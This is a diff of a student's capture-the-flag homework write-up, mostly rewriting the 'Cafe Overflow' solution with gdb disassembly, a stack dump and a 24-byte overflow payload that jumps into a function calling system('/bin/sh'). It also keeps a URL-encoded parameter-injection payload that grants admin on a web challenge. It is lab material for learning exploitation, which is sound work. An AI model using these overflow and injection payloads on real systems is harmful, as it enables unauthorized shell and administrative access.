@@ -41,49 +41,122 @@
       - `cute` only take the part before the next `&`
    3. *url encoding* to bypass it
       > find the correspoding encode for `"}&#`  
+      
       - then, the url should be `https://owohub.zoolab.org/auth?username=a&cute=true,%22admin%22:true%7D%26givemeflag=yes%23true`
 
 ## pwn - Cafe Overflow
 > flag{c0ffee_0verfl0win6_from_k3ttle_QAQ}  
 > [solution](./pwn/solve.py)
 
-1. disassemble the binary with `objdump -d -M intel CafeOverflow`
-   ```nasm
-   401234:	e8 17 fe ff ff       	call   401050 <printf@plt>
-   401239:	48 8d 45 f0          	lea    rax,[rbp-0x10]
-   40123d:	48 89 c6             	mov    rsi,rax
-   401240:	48 8d 3d f6 0d 00 00 	lea    rdi,[rip+0xdf6]        # 40203d <_IO_stdin_used+0x3d>
-   401247:	b8 00 00 00 00       	mov    eax,0x0
-   40124c:	e8 1f fe ff ff       	call   401070 <__isoc99_scanf@plt>
+1. Start `gdb` and `disas main`.
+
    ```
-   Use `scanf` to get input in the *main function* with a buffer size of `0x10`. Therefore, it's vulnerable to **buffer overflow**. Pad `0x10` characters to fill the gap and 8 more byte to overwrite `rbp` and then its our target, ***the return address***.
-2. In order to get the flag, we have to open shell and read the content of the remote file, *flag*.
-   ```nasm
-   0000000000401176 <func1>:
-   401176:	55                   	push   rbp
-   401177:	48 89 e5             	mov    rbp,rsp
-   40117a:	48 83 ec 10          	sub    rsp,0x10
-   40117e:	48 89 c0             	mov    rax,rax
-   401181:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
-   401185:	48 b8 fe ca fe ca fe 	movabs rax,0xcafecafecafecafe
-   40118c:	ca fe ca 
-   40118f:	48 39 45 f8          	cmp    QWORD PTR [rbp-0x8],rax
-   401193:	75 22                	jne    4011b7 <func1+0x41>
-   401195:	48 8d 3d 68 0e 00 00 	lea    rdi,[rip+0xe68]        # 402004 <_IO_stdin_used+0x4>
-   40119c:	e8 8f fe ff ff       	call   401030 <puts@plt>
-   4011a1:	48 8d 3d 68 0e 00 00 	lea    rdi,[rip+0xe68]        # 402010 <_IO_stdin_used+0x10>
-   4011a8:	e8 93 fe ff ff       	call   401040 <system@plt>
-   4011ad:	bf 00 00 00 00       	mov    edi,0x0
-   4011b2:	e8 c9 fe ff ff       	call   401080 <exit@plt>
-   4011b7:	48 8d 3d 5a 0e 00 00 	lea    rdi,[rip+0xe5a]        # 402018 <_IO_stdin_used+0x18>
-   4011be:	e8 6d fe ff ff       	call   401030 <puts@plt>
-   4011c3:	90                   	nop
-   4011c4:	c9                   	leave  
-   4011c5:	c3                   	ret 
+   gdb-peda$ disas main
+   Dump of assembler code for function main:
+      0x00000000004011c6 <+0>:	push   rbp
+      0x00000000004011c7 <+1>:	mov    rbp,rsp
+   => 0x00000000004011ca <+4>:	sub    rsp,0x10
+      ......
+      0x0000000000401228 <+98>:	lea    rdi,[rip+0xdf9]        # 0x402028
+      0x000000000040122f <+105>:	mov    eax,0x0
+      0x0000000000401234 <+110>:	call   0x401050 <printf@plt>
+      0x0000000000401239 <+115>:	lea    rax,[rbp-0x10]
+      0x000000000040123d <+119>:	mov    rsi,rax
+      0x0000000000401240 <+122>:	lea    rdi,[rip+0xdf6]        # 0x40203d
+      0x0000000000401247 <+129>:	mov    eax,0x0
+      0x000000000040124c <+134>:	call   0x401070 <__isoc99_scanf@plt>
+      0x0000000000401251 <+139>:	lea    rax,[rbp-0x10]
+      0x0000000000401255 <+143>:	mov    rsi,rax
+      0x0000000000401258 <+146>:	lea    rdi,[rip+0xde1]        # 0x402040
+      0x000000000040125f <+153>:	mov    eax,0x0
+      0x0000000000401264 <+158>:	call   0x401050 <printf@plt>
+      0x0000000000401269 <+163>:	lea    rax,[rbp-0x10]
+      0x000000000040126d <+167>:	mov    rax,QWORD PTR [rax]
+      0x0000000000401270 <+170>:	leave
+      0x0000000000401271 <+171>:	ret
+   End of assembler dump.
    ```
-   Find a function, `fun1`, that never been called but call `system("/bin/sh")`. However, if call `func1`, it needs to fulfill certain requirement to jump to where it call `system("/bin/sh")`. Therefore, let it jump to `0x401195` directly.
-3. Combine step 1 and 2.  
-   `payload = 'a' * (0x10 + 8) + p64(0x401195)`
+
+   From the assembler code, the program use `printf` to output some information and use `scanf` to get the input.
+
+2. Observer the stack after `scanf`.
+
+   ```
+   [----------------------------------registers-----------------------------------]
+   RAX: 0x1
+   RBX: 0x0
+   RCX: 0x7ffff7dd0560 --> 0x7ffff7dcc580 --> 0x7ffff7b99bce --> 0x636d656d5f5f0043 ('C')
+   RDX: 0x7ffff7dd18d0 --> 0x0
+   RSI: 0x1
+   RDI: 0x0
+   RBP: 0x7fffffffe580 --> 0x401280 (<__libc_csu_init>:	endbr64)
+   RSP: 0x7fffffffe570 ("AAAAAAAA")
+   RIP: 0x401251 (<main+139>:	lea    rax,[rbp-0x10])
+   R8 : 0x0
+   R9 : 0x0
+   R10: 0x0
+   R11: 0x40203f --> 0x202c6f6c6c654800 ('')
+   R12: 0x401090 (<_start>:	endbr64)
+   R13: 0x7fffffffe660 --> 0x1
+   R14: 0x0
+   R15: 0x0
+   EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+   [-------------------------------------code-------------------------------------]
+      0x401240 <main+122>:	lea    rdi,[rip+0xdf6]        # 0x40203d
+      0x401247 <main+129>:	mov    eax,0x0
+      0x40124c <main+134>:	call   0x401070 <__isoc99_scanf@plt>
+   => 0x401251 <main+139>:	lea    rax,[rbp-0x10]
+      0x401255 <main+143>:	mov    rsi,rax
+      0x401258 <main+146>:	lea    rdi,[rip+0xde1]        # 0x402040
+      0x40125f <main+153>:	mov    eax,0x0
+      0x401264 <main+158>:	call   0x401050 <printf@plt>
+   [------------------------------------stack-------------------------------------]
+   0000| 0x7fffffffe570 ("AAAAAAAA")
+   0008| 0x7fffffffe578 --> 0x0
+   0016| 0x7fffffffe580 --> 0x401280 (<__libc_csu_init>:	endbr64)
+   0024| 0x7fffffffe588 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
+   0032| 0x7fffffffe590 --> 0x1
+   0040| 0x7fffffffe598 --> 0x7fffffffe668 --> 0x7fffffffe847 ("/root/mhsuab/Desktop/ComputerSecurity2020/hw0/pwn/CafeOverflow")
+   0048| 0x7fffffffe5a0 --> 0x100008000
+   0056| 0x7fffffffe5a8 --> 0x4011c6 (<main>:	push   rbp)
+   [------------------------------------------------------------------------------]
+   Legend: code, data, rodata, value
+   0x0000000000401251 in main ()
+   ```
+
+   Input `AAAAAAAA` to observer the stack. Find that the start address of the input is `0x7fffffffe570` and, as `scanf` use `%s` specifier, it accept **any number** of *non-whitespace* characters, stopping at the first whitespace. Also, find that the address of **RBP** is `0x7fffffffe580` and the **return address** at `0x7fffffffe588`. Therefore, pad `0x7fffffffe588 - 0x7fffffffe570 = 24` characters to overwrite **RBP**, add a *target address* after it to overwrite the **return address** and jump to our destination *address*.
+
+3. List out all the functions and find an interesting function `func1`.
+
+   ```
+   disas func1
+   Dump of assembler code for function func1:
+      0x0000000000401176 <+0>:	push   rbp
+      0x0000000000401177 <+1>:	mov    rbp,rsp
+      0x000000000040117a <+4>:	sub    rsp,0x10
+      0x000000000040117e <+8>:	mov    rax,rax
+      0x0000000000401181 <+11>:	mov    QWORD PTR [rbp-0x8],rax
+      0x0000000000401185 <+15>:	movabs rax,0xcafecafecafecafe
+      0x000000000040118f <+25>:	cmp    QWORD PTR [rbp-0x8],rax
+      0x0000000000401193 <+29>:	jne    0x4011b7 <func1+65>
+      0x0000000000401195 <+31>:	lea    rdi,[rip+0xe68]        # 0x402004 ("Here you go")
+      0x000000000040119c <+38>:	call   0x401030 <puts@plt>
+      0x00000000004011a1 <+43>:	lea    rdi,[rip+0xe68]        # 0x402010 --> 0x68732f6e69622f ('/bin/sh')
+      0x00000000004011a8 <+50>:	call   0x401040 <system@plt>
+      0x00000000004011ad <+55>:	mov    edi,0x0
+      0x00000000004011b2 <+60>:	call   0x401080 <exit@plt>
+      0x00000000004011b7 <+65>:	lea    rdi,[rip+0xe5a]        # 0x402018
+      0x00000000004011be <+72>:	call   0x401030 <puts@plt>
+      0x00000000004011c3 <+77>:	nop
+      0x00000000004011c4 <+78>:	leave
+      0x00000000004011c5 <+79>:	ret
+   End of assembler dump.
+   ```
+
+   Call `system('/bin/sh')` when fulfill certain requirements. Instead of trying to fulfill the requirements, jump pass it. Therefore, the *target address* should be `0x401195`(`0x4011a1` can also achieve our goal).
+
+4. Combine all the steps.  
+   `payload = 'a' * (0x10 + 8) + p64(0x401195)` send it through script to get shell and the flag.
 
 ## Misc - The Floating Aquamarine
 > FLAG{floating_point_error_https://0.30000000000000004.com/}  
@@ -149,6 +222,7 @@ How many Aquamarine stones do you want to buy/loan (positive) or sell (negative)
       ```
       Reverse `_encrypt`. Find out the last used `count`, which is `0x59d60180`, and perform certain operation 32 times, reversing the order of `cts[0], cts[1]` and substracting a certain value each time.
 4. Guess [output.txt](./crypto/output.txt) is the result of [encrypt.py](./crypto/encrypt.py) `n` days ago. Starting from `n` days ago, start brute force :joy: .
+   
    - Knowing that the flag has initial `flag{` or `FLAG`, stop when find a decrypted text has such initial and print out its seed and the result.
 
 ## Reverse - EekumBokum
